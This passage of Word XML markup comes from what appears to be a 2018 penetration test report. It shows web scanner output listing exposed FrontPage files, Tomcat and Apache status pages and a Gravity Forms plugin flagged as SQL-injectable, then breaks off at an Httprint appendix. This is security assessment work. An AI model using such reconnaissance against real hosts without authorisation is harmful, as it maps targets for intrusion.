      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>vti_pvt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>service.grp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B60FA84" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>vti_pvt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>botsinf.cnf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3277761E" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>vti_pvt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>structure.cnf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFB2069" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>vti_pvt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>uniqperm.cnf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1728DF" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/server-manager/: Mitel Audio and Web Conferencing server manager identified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F87CCD9" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>wp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>-content/plugins/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>gravityforms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/change_log.txt: Gravity forms is installed. Based on the version number in the changelog, it is vulnerable to an authenticated SQL injection. https://wpvulndb.com/vulnerabilities/7849</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CA98DF" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/manager/status: Tomcat Server Status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52575630" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>jk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>-manager/status: Tomcat Server Status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B924B99" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>jk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>-status/status: Tomcat Server Status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366B1675" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/admin/status: Tomcat Server Status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4549534E" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/host-manager/status: Tomcat Server Status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290DB825" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/server-status: Apache server-status interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5E30FF" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/server-info: Apache server-info interface found (pass protected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8A5A09" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>+ 7540 requests: 0 error(s) and 2375 item(s) reported on remote host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CACFC56" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ End Time:           2018-11-08 09:39:47 (GMT-5) (59 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03594CC2" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E255F7" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ 1 host(s) tested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D08B401" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01EE6AF3" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:spacing w:after="1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3289A500" w14:textId="77777777" w:rsidR="00351C72" w:rsidRDefault="00351C72" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="658BB7BC" w14:textId="77777777" w:rsidR="00351C72" w:rsidRDefault="00351C72" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C1483C2" w14:textId="77777777" w:rsidR="00481CA9" w:rsidRDefault="00481CA9" w:rsidP="00481CA9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc531104380"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix D</w:t>
      </w:r>
      <w:r w:rsidR="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00776D91">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Httprint</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B05A54" w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0F88DB" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>:~</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>/Desktop/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>/httprint_301/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
